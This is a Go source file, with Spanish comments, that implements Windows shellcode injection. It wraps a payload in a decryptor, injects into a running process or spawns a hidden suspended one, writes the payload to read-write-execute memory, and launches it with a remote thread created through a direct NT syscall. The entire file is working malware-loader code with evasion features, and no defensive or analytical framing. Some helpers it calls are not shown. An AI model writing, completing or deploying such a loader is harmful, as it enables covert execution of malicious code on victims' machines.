package injection

import (
	"fmt"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

type DLLInjector struct{}

func NewDLLInjector() *DLLInjector { return &DLLInjector{} }

func (d *DLLInjector) Inject(targetExe string, payload []byte) error {
	wrapped := wrapWithDecryptor(payload)

	procName := filepath.Base(targetExe)
	if pid, err := findPID(procName); err == nil {
		if err2 := injectExisting(pid, wrapped); err2 == nil {
			return nil // inyectó en proceso existente
		}
	}

	return injectSuspended(targetExe, wrapped)
}

func hollowNew(targetExe string, wrapped []byte) error {
	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := &windows.ProcessInformation{}

	cmd, err := windows.UTF16PtrFromString(targetExe)
	if err != nil {
		return fmt.Errorf("utf16: %w", err)
	}
	if err = windows.CreateProcess(nil, cmd, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi); err != nil {
		return fmt.Errorf("spawn: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// Alocar, escribir y marcar RWX (stub necesita escribir para descifrar)
	baseAddr, err := allocAndWrite(pi.Process, wrapped, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	// Resumir el hilo principal PRIMERO para que el proceso inicialice
	// ws2_32, kernel32, etc. antes de que el shellcode los use.
	if _, err = windows.ResumeThread(pi.Thread); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("resume: %w", err)
	}

	// WaitForInputIdle: bloquea hasta que el proceso terminó su startup
	// y está esperando input (DLLs ya inicializados). Timeout 5s.
	user32 := windows.NewLazyDLL("user32.dll")
	user32.NewProc("WaitForInputIdle").Call(uintptr(pi.Process), 5000)

	// Ahora inyectar el thread en el proceso ya inicializado
	var remoteThread windows.Handle
	ret, _ := ntCall(_sCreateThread,
		uintptr(unsafe.Pointer(&remoteThread)),
		uintptr(windows.PROCESS_ALL_ACCESS),
		0,
		uintptr(pi.Process),
		baseAddr,
		0, 0, 0, 0, 0,
	)
	if ret != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("thread: 0x%x", ret)
	}
	windows.CloseHandle(remoteThread)
	return nil
}
